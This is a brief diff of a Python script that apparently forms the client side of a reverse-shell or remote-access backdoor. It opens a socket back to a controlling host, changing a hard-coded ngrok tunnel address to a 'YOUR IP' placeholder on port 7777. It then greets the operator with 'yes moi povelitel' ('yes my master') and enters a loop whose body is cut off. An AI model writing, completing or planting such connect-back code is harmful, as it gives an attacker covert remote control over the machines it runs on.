@@ -4,7 +4,7 @@ import socket
 import socket
 
 sock = socket.socket()
-sock.connect(('2.tcp.eu.ngrok.io', 11048))
+sock.connect(('YOUR IP', 7777))
 
 sock.send('yes moi povelitel'.encode())
 while True:
